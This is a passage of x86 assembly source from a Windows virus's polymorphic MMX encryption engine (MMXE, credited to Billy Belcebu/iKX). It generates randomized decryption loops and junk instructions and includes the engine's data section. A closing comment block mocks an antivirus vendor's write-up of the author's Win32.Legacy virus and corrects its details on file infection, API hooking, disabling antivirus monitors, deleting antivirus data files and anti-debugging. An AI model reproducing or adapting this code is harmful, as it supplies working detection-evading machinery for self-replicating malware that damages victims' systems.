       mov     ax,6E0Fh                        ; MOV mmx_ptr,[reg_ptr]
       stosw
       movzx   eax,byte ptr [ebp+@@mmx_ptr2data]
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_ptr2data]
       stosb
       or      word ptr [ebp+@@flags],_PASSPTR2MMX
       ret

   ; Generate the MMX encryption opcode:
   ; PXOR

   @@gen_crypt_instructions:
       mov     ax,0EF0Fh                          ; PXOR mmx_ptr,mmx_key
       stosw
       movzx   eax,byte ptr [ebp+@@mmx_ptr2data]
       shl     eax,3
       or      al,byte ptr [ebp+@@mmx_key]
       or      al,11000000b
       stosb
       or      word ptr [ebp+@@flags],_CRYPT
       ret

   ; Generate the alternative method of MMX encryption code:
   ; PXOR = XOR

   @@gen_non_mmx_crypt_instructions:
       mov     ax,0031h                        ; XOR [reg_ptr],reg_key
       movzx   ebx,byte ptr [ebp+@@reg_key]
       shl     ebx,3
       or      bl,byte ptr [ebp+@@reg_ptr2data]
       or      ah,bl
       stosw
       ret

   ; Generate the code that will pass the already decrypted data to its original
   ; position

   @@gen_passmmx2ptr:
       mov     ax,7E0Fh                        ; MOVD [reg_ptr],(mmx_ptr xor mmx_key)
       stosw
       movzx   eax,byte ptr [ebp+@@mmx_ptr2data]
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_ptr2data]
       stosb
       or      word ptr [ebp+@@flags],_PASSMMX2PTR
       ret

   ; Select the order between increase pointer and decrease counter

   @@gen_incpointer_deccounter:
           call    r_range,02h
       xchg    eax,ecx
       jecxz   @@gdc_gip
   @@gip_gdc:
       call    @@gen_incpointer
       call    @@gen_some_garbage
       call    @@gen_deccounter
       ret
   @@gdc_gip:
       call    @@gen_deccounter
       call    @@gen_some_garbage
       call    @@gen_incpointer
       ret

   ; Generate the code for make the pointer register to point to the next dword

   @@gen_incpointer:
           call    r_range,05h
       xchg    eax,ecx
       jecxz   @@gip_@@2
       dec     ecx
       jz      @@gip_@@3
       dec     ecx
       jz      @@gip_@@4
       dec     ecx
       jnz     @@gip_@@1
       jmp     @@gip_@@5

   @@gip_@@1:
       mov     bl,4                            ; ADD reg_ptr,4
       call    @@gip_AddIt
       jmp     @@gip_EXIT

   @@gip_@@2:
           call    r_range,02h
       xchg    eax,ecx
       jecxz   @@gip_@@2_@@2
   @@gip_@@2_@@1:
       mov     bl,3                            ; ADD reg_ptr,3
       call    @@gip_AddIt

       call    @@gen_garbage

       mov     bl,1                            ; INC reg_ptr
       call    @@gip_IncIt
       jmp     @@gip_@@2_EXIT
   @@gip_@@2_@@2:
       mov     bl,1                            ; INC reg_ptr
       call    @@gip_IncIt

       call    @@gen_garbage

       mov     bl,3
       call    @@gip_AddIt                     ; ADD reg_ptr,3
   @@gip_@@2_EXIT:
       jmp     @@gip_EXIT

   @@gip_@@3:
           call    r_range,02h
       xchg    eax,ecx
       jecxz   @@gip_@@3_@@2
   @@gip_@@3_@@1:
       mov     bl,2                            ; ADD reg_ptr,2
       call    @@gip_AddIt

       call    @@gen_garbage

       mov     bl,2                            ; INC reg_ptr
       call    @@gip_IncIt                     ; INC reg_ptr
       jmp     @@gip_@@2_EXIT
   @@gip_@@3_@@2:
       mov     bl,2                            ; INC reg_ptr
       call    @@gip_IncIt                     ; INC reg_ptr

       call    @@gen_garbage

       mov     bl,2                            ; ADD reg_ptr,2
       call    @@gip_AddIt
       jmp     @@gip_@@2_EXIT

   @@gip_@@4:
           call    r_range,02h
       xchg    eax,ecx
       jecxz   @@gip_@@4_@@2
   @@gip_@@4_@@1:
       mov     bl,1                            ; ADD reg_ptr,1
       call    @@gip_AddIt                     ; INC reg_ptr

       call    @@gen_garbage

       mov     bl,3                            ; INC reg_ptr
       call    @@gip_IncIt                     ; INC reg_ptr
       jmp     @@gip_@@2_EXIT
   @@gip_@@4_@@2:
       mov     bl,1                            ; INC reg_ptr
       call    @@gip_IncIt                     ; INC reg_ptr

       call    @@gen_garbage

       mov     bl,3                            ; INC reg_ptr
       call    @@gip_AddIt                     ; ADD reg_ptr,1
       jmp     @@gip_@@2_EXIT

   @@gip_@@5:                                      ; INC reg_ptr
       mov     bl,4                            ; INC reg_ptr
       call    @@gip_IncIt                     ; INC reg_ptr
                           ; INC reg_ptr

   @@gip_EXIT:
       or      word ptr [ebp+@@flags],_INCPOINTER
       ret

   @@gip_AddIt:
       mov     al,83h
       stosb
       mov     al,byte ptr [ebp+@@reg_ptr2data]
       or      al,11000000b
       stosb
       mov     al,bl
       stosb
       ret

   @@gip_IncIt:
       movzx   ecx,bl
       mov     al,40h
       add     al,byte ptr [ebp+@@reg_ptr2data]
   @@gip_II_Loop:
       stosb
       push    ecx eax
       call    @@gen_garbage
       pop     eax ecx
       loop    @@gip_II_Loop
       ret

   ; Generate the code that will decrease in one unit the counter

   @@gen_deccounter:
           call    r_range,03h
       xchg    eax,ecx
       jecxz   @@gdc_@@2
       dec     ecx
       jecxz   @@gdc_@@3
   @@gdc_@@1:
       mov     al,83h                          ; SUB reg_size,1
       stosb
       mov     al,byte ptr [ebp+@@reg_counter]
       or      al,11101000b
       stosb
       mov     al,1
       stosb
       jmp     @@gdc_EXIT
   @@gdc_@@2:
       mov     al,48h                          ; DEC reg_size
       add     al,byte ptr [ebp+@@reg_counter]
       stosb
       jmp     @@gdc_EXIT
   @@gdc_@@3:
       mov     al,83h                          ; ADD reg_size,-1
       stosb
       mov     al,byte ptr [ebp+@@reg_counter]
       or      al,11000000b
       stosb
       mov     al,0FFh
       stosb
   @@gdc_EXIT:
       or      word ptr [ebp+@@flags],_DECCOUNTER
       ret

   ; Generate the loop-alike thingy

   @@gen_loop:
           call    r_range,04h
       or      eax,eax
       jz      @@gl_@@3
       dec     eax
       jz      @@gl_@@2
       dec     eax
       jz      @@gl_@@1
   @@gl_@@0:
       mov     al,83h                          ; CMP reg_size,00h
       stosb
       movzx   eax,byte ptr [ebp+@@reg_counter]
       or      al,11111000b
       stosb
       xor     eax,eax
       stosb
       jmp     @@gl_dojnz
   @@gl_@@1:
       mov     al,83h                          ; CMP reg_size,-1
       stosb
       movzx   eax,byte ptr [ebp+@@reg_counter]
       or      al,11111000b
       stosb
       xor     eax,eax
       dec     eax
       stosb
       mov     eax,dword ptr [ebp+@@size_address]
       dec     dword ptr [eax]
       jmp     @@gl_dojnz
   @@gl_@@2:
       mov     al,0Bh                          ; OR reg_size,reg_size
       stosb
       movzx   eax,byte ptr [ebp+@@reg_counter]
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_counter]
       or      al,11000000b
       stosb
       jmp     @@gl_dojnz
   @@gl_@@3:
       mov     al,85h
       stosb
       movzx   eax,byte ptr [ebp+@@reg_counter] ; TEST reg_size,reg_size
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_counter]
       or      al,11000000b
       stosb
       mov     eax,dword ptr [ebp+@@size_address]
       dec     dword ptr [eax]
   @@gl_dojnz:
       mov     ax,850Fh                        ; JNZ LOOP_ADDRESS
       stosw
       mov     eax,dword ptr [ebp+@@l00paddress]
       sub     eax,edi
       sub     eax,00000004h
       stosd
       or      word ptr [ebp+@@flags],_LOOP
   @@do_anything:
       ret

   ; --- Garbage generator's table

   @@gbgtbl        label   byte
       dd      offset (@@do_anything)  ; Oh, my lazy engine! :)
           dd      offset (@@gen_mov_regx_immx)
           dd      offset (@@gen_mov_regx_regx)
           dd      offset (@@gen_arithmetic_regx_immx)
           dd      offset (@@gen_arithmetic_regx_regx)
           dd      offset (@@gen_push_immx_pop_regx)
           dd      offset (@@gen_push_regx_pop_regx)
           dd      offset (@@gen_comparison_jx)
           dd      offset (@@gen_call_to_subroutine)
           dd      offset (@@gen_movzx_movsx)
           dd      offset (@@gen_weird_opcodes)
       dd      offset (@@gen_zer0_reg)
   @@non_mmx_gbg   equ     (($-offset @@gbgtbl)/4)
   ; MMX Garbage generatorz
       dd      offset (@@gen_mmx_group1)
       dd      offset (@@gen_mmx_group2)
       dd      offset (@@gen_mmx_group3)
       dd      offset (@@gen_mmx_movq_mm?_mm?)
       dd      offset (@@gen_mmx_movd_mm?_reg32)
   @@s_gbgtbl      equ     (($-offset @@gbgtbl)/4)

   ; MMX version

   @@after_looptbl label   byte
       dd      offset (@@gen_passptr2mmx)        ;\
       dd      offset (@@gen_crypt_instructions) ; >- Must follow this order
       dd      offset (@@gen_passmmx2ptr)        ;/
       dd      offset (@@gen_incpointer_deccounter)
       dd      offset (@@gen_loop)
   @@s_aftlooptbl  equ     (($-offset @@after_looptbl)/4)

   ; Non MMX version

   @@after_l00ptbl label   byte
       dd      offset (@@gen_non_mmx_crypt_instructions)
       dd      offset (@@gen_incpointer_deccounter)
       dd      offset (@@gen_loop)
   @@s_aftl00ptbl  equ     (($-offset @@after_l00ptbl)/4)

   mmxe_end        label   byte
   mmxe            endp

   ; end     fakehost


   ;-----------------------------[ MMXEDATA.INC ]------------------------------;

   ;############################################################################
   ;# WIN32.FOREVER - MMXE 1.02 DATA                (c) 2000 Billy Belcebu/iKX #
   ;############################################################################

   ; Registers used

   @@reg_key       db      00h
   @@reg_ptr2data  db      00h
   @@reg_counter   db      00h
   @@reg_delta     db      00h
   @@reg_mask      db      00h

   @@mmx_ptr2data  db      00h
   @@mmx_key       db      00h

   @@init_mmx?     db      00h

   @@ptr_data2enc  dd      00000000h
   @@ptr_buffer    dd      00000000h
   @@size2enc      dd      00000000h
   @@size2cryptd4  dd      00000000h
   @@tmp_call      dd      00000000h
   @@fix1          dd      00000000h
   @@fix2          dd      00000000h
   @@enc_key       dd      00000000h
   @@l00paddress   dd      00000000h
   @@size_address  dd      00000000h
   @@ptrto2nd      dd      00000000h
   @@flags         dw      0000h
   @@recursion     db      00h
   @@it_was_bt     db      00h
   @@inside_call   db      00h


   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % BONUS TRACK                                                             %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ;
   ; Hi! Welcome to the shit-o-matic! Here you'll see in action the lameness of
   ; the AVP guys while describing my Win32.Legacy...
   ;
   ; Here follows the whole description, and my comments are between [* and *]
   ;
   ; Win32.Legacy
   ; ---------------------------------------------------------------------------
   ;
   ; This is a per-process memory resident parasitic Win32 virus. The virus
   ; affects PE EXE files (Win32 executables) as well as adds infected EXE files
   ; to RAR and ARJ archives. The virus code and algorithms are closely related
   ; to some other Windows viruses like "Thorin", and it seems to be a remake of
   ; already known Windows viruses.
   ;
   ; [* Yes, it has routines from Thorin, but Thorin is also mine and i can   *]
   ; [* copy whatever i want to. But what the fuck is that of remake? Of what *]
   ; [* viruses? Are you calling me lamer? HAH! One day i'll tell ya examples *]
   ; [* of coders doing remakes (copy'n'paste), but i am not one of them!     *]
   ;
   ; The virus is about 16Kb of length. It is large enough for a virus written
   ; in Assembler.This large size however is caused by virus infection algorithm
   ; polymorphic engines, payload routines and many tricks used by the virus to
   ; make its detection more difficult.
   ;
   ; [* Another error, as they've cut'n'pasted this part almost exactly from  *]
   ; [* Win32.Thorin. Look at this of 'payload routines'... Why in plural?    *]
   ; [* There is only one payload, so this shouldn't be in plural.            *]
   ;
   ; The virus uses several polymorphic engines and is encrypted several times.
   ; One of virus polymorphic routines uses MMX instructions in the code, and as
   ; a result the virus does not work on old i486- and old Pentium machines. The
   ; virus also uses "on-the-fly" encryption: most of its routines stay
   ; encrypted after main decryption loops. In case of need the virus decrypts
   ; necessary routine, calls it, and then encrypts again.
   ;
   ; [* What debugger do you use? Of course that Legacy works in old machines *]
   ; [* I coded a check for that, and it performs the same task of decrypting *]
   ; [* with normal instructions! LIERS! LAMERS!                              *]
   ;
   ; Infection
   ; ---------
   ; The virus infection routine scans Windows, Windows system and current
   ; directories, looks for .EXE, .CPL and .SCR Windows executable files there
   ; and infects them. The virus also looks for RAR and ARJ archives, processes
   ; their internal formats and adds an infected files to there.
   ;
   ; While infecting an EXE file the virus increases the size of last file
   ; section, encrypts itself and writes to there. The virus also modifies
   ; necessary PE header fields, but does not touch program's startup address.
   ; To get control on infected file run the virus inserts polymorphic routine
   ; which by using a trick passes control to the main virus body.
   ;
   ; [* Ok, i guess you are talking about PHIRE engine... *]
   ;
   ; Per-process resident
   ; --------------------
   ; To stay in Windows memory (per-process resident) the virus scans infected
   ; application (host file) imports, gets addresses of ten file access and
   ; execution functions (MoveFileA, CopyFileA, GetFullPathNameA, DeleteFileA,
   ; WinExec, CreateProcessA, CreateFileA, GetFileAttributesA, FindFirstFileA,
   ; FindNextFileA) and hooks them. When an infected application calls any of
   ; listed functions, the virus gets file name, checks the file and infects it.
   ;
   ; [* FAKE-O-MATIC: It hooks 16 (not 10d, it's 10h!) functions, and da guys *]
   ; [* missed many of them here (too lazy for see what CRC32 matches with    *]
   ; [* each API?) The APIs hooked are:MoveFileA, CopyFileA, GetFullPathNameA *]
   ; [* DeleteFileA, WinExec, CreateFileA, CreateProcessA, GetFileAttributesA *]
   ; [* SetFileAttributesA, _lopen, MoveFileExA, CopyFileExA, OpenFile,       *]
   ; [* GetProcAddress, FindFirstFileA, FindNextFileA.                        *]
   ;
   ; Other features and payload
   ; --------------------------
   ; The virus uses anti-debugging tricks and exits under debugger. The virus
   ; also disables anti-virus monitors "AVP Monitor" and "Amon Antivirus
   ; Monitor" as well as deletes the anti-virus data files: ANTI-VIR.DAT
   ; CHKLIST.DAT CHKLIST.TAV CHKLIST.MS CHKLIST.CPS AVP.CRC IVB.NTZ SMARTCHK.MS
   ; SMARTCHK.CPS.
   ;
   ; [* FAKE : It exit ONLY if SoftICE is present, if any application         *]
   ; [* debugger is detected, the virus CRASH it                              *]
   ;
   ; The virus has a payload routine that is activated on July 31. This routine
   ; modifies the registry key with new "DisplayName" value.
   ;
   ; The payload routine then displays the message window:
   ;
   ;  [Win32.Legacy.15707 v1.00]
   ;   Welcolme to the Win32.Legacy payload. You are infected by a virus,
   ;   i am your worst nightmare... But BEWARE! Your organism is also
   ;   infected. So go to the doctor and ask him for a cure for this...
   ;   Featuring:
   ;        MultiMedia eXtensions Engine [MMXE v1.01]
   ;        Polymorphic Header Idiot Random Engine [PHIRE v1.00]
   ;        Internal ENCryptor technology [iENC v1.00]
   ;
   ;  Greetings:
   ;        StarZer0/iKX & Int13h -> Thanx for information about archives
   ;        Murkry/iKX -> Thanx for 'Win95 Structures & Secrets' article
   ;        zAxOn/DDT -> Thanx for getting me into ASM
   ;        Benny/29A -> Thanx for information about threads
   ;        The Mental Driller/29A -> Thanx for polymorphy ideas
   ;        Super/29A -> Thanx for optimization knowledge & opcode list
   ;        Wintermute -> Thanx for emulation ideas
   ;        Ypsilon -> Thanx for NT information & cool ideas
   ;
   ;  I don't like the drugs...
   ;        But the drugs like me!
   ;
   ;  (c) 1999 Billy Belcebu/iKX          < billy_belcebu@mixmail.com >
   ;
   ; [* Ok, you can copy strings ok, i see... That thing of 'Welcolme' was my *]
   ; [* fail, oh shit :) *]
   ;
   ; The virus also contains the text strings:
   ;  Welcome to the realm of the legacy of kings...
   ;  [PHIRE v1.00]
   ;  [- (c) 1999 Billy Belcebu/iKX -]
   ;  [iENC v1.00]
   ;
   ; [* You missed one string: '[MMXE v1.01]' ,that is inside the poly itself *]
   ;
   ; ---------------------------------------------------------------------------
   ; Ok, here you had been able to see how lame are them. Mwahahahahahahahahaha!
